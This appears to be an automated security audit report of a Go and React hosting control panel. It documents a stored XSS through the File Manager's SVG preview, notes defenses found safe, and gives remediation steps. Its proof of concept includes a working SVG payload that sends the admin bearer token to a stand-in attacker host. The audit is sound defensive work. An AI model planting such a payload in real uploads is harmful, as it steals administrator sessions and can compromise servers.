# sc-xss results

One credible stored XSS reachable via the File Manager SVG preview; server-side HTML generators are properly escaped and the React dashboard uses no unsafe-HTML sinks.

---

## Finding XSS-001: Stored XSS via SVG preview in File Manager (blob URL in dashboard origin)

- **Severity:** High
- **Confidence:** 70
- **CWE:** CWE-79 (Cross-site Scripting)
- **Files:**
  - `internal/admin/handlers_files.go:289-333` (server serves `.svg` with `Content-Type: image/svg+xml`, no `Content-Disposition`, no `nosniff`, no CSP)
  - `web/dashboard/src/pages/FileManager.tsx:179-209` (client previews `.svg` via `window.open(blobURL)`)

### Evidence

Server (`handleFileRead`) returns the raw file bytes for image extensions, and for `.svg` sets a renderable, script-capable content type:

```go
case strings.HasSuffix(lowerPath, ".svg"):
    contentType = "image/svg+xml"
...
w.Header().Set("Content-Type", contentType)
w.Header().Set("Content-Length", fmt.Sprintf("%d", len(data)))
w.Write(data)   // no Content-Disposition: attachment, no X-Content-Type-Options, no CSP
```

Client (`FileManager.tsx`) treats `.svg` as an "image", fetches it with the auth header, wraps it in a same-origin `blob:` URL and opens it as a top-level document:

```ts
if (lowerName.endsWith('.svg') || ...) {
  const res = await fetch(`/api/v1/files/.../read?path=...`, { headers: getAuthHeaders() });
  const blob = await res.blob();              // blob inherits image/svg+xml type
  const url = URL.createObjectURL(blob);      // blob: URL == dashboard origin
  const win = window.open(url, '_blank');     // no 'noopener' -> opener accessible
}
```

### Why it's exploitable

- An SVG document with `<script>` (or `onload=`) executes JavaScript when opened as a top-level `image/svg+xml` document. A `blob:` URL created by the dashboard inherits the dashboard's origin, so that script runs in the admin panel origin.
- Reachability of the stored payload: any principal able to write a file into a domain web root can plant `evil.svg` — a lower-privileged RBAC `user`/`reseller` with `file.write`, a built-in SFTP/site user (chroot to their domain root), or a hosted web app (e.g. WordPress media that permits SVG). A higher-privileged operator/admin then clicks the file to "preview" it and is compromised. This is a genuine cross-user stored XSS, not self-XSS.
- Impact escalation: `window.open` is called without `noopener`, so the SVG document retains a same-origin `window.opener` reference to the dashboard and can read its state. Additionally, opening a same-origin auxiliary context copies the opener's `sessionStorage`, which holds the bearer token (`sessionStorage.getItem('uwas_token')`, `web/dashboard/src/lib/api.ts:5`). The attacker script can therefore exfiltrate the admin token / drive the 250+ admin API endpoints, i.e. full server compromise.
- No mitigating CSP exists: the SPA `index.html` is served without any `Content-Security-Policy` (`internal/admin/routes.go:410-426`), and the `/read` SVG response sets neither CSP nor `X-Content-Type-Options: nosniff` nor `Content-Disposition: attachment`.

### Proof of concept

1. As any principal with write access to a domain root, upload `x.svg`:
   ```xml
   <svg xmlns="http://www.w3.org/2000/svg" onload="navigator.sendBeacon('//attacker/c', sessionStorage.getItem('uwas_token'))"/>
   ```
2. An admin opens the File Manager for that domain and clicks `x.svg` to preview it.
3. The SVG script runs in the dashboard origin and exfiltrates the bearer token.

### Remediation

- Do not render uploaded SVGs inline. For the `/read` image path, send `Content-Disposition: attachment` and `X-Content-Type-Options: nosniff`, or serve SVG as `text/plain`.
- Drop `.svg` from the client image-preview branch in `FileManager.tsx`, or render previews inside a `sandbox`ed `<iframe>` (no `allow-scripts`) instead of `window.open`.
- Add `noopener` to any `window.open` of fetched content.
- Add a strict `Content-Security-Policy` (e.g. `default-src 'self'; script-src 'self'; object-src 'none'`) to the dashboard `index.html` response and to file-content responses (`script-src 'none'`).

---

## Defenses observed (no finding)

- `internal/handler/static/listing.go` — directory listing HTML escapes every file name and the URL path with `html.EscapeString`. Safe.
- `internal/server/errors.go` — default error pages interpolate only an int code and a fixed `http.StatusText`/title-map string; no user input. Safe.
- `internal/admin/handlers_domain.go:307` — placeholder `index.html` embeds `d.Host`, but the domain hostname is validated by a strict regex that rejects `<`/injection characters, and it is admin-self content. Not exploitable.
- React 19 dashboard: no `dangerouslySetInnerHTML`, no `innerHTML`/`outerHTML`/`document.write`, no `eval`/`new Function`. All `href`/`src` bindings point at hostnames/known URLs (no `javascript:` sinks). JSX auto-escaping covers reflected/stored API data.
- `jsonResponse` sets `nosniff`, `X-Frame-Options: DENY`, HSTS on JSON API responses.
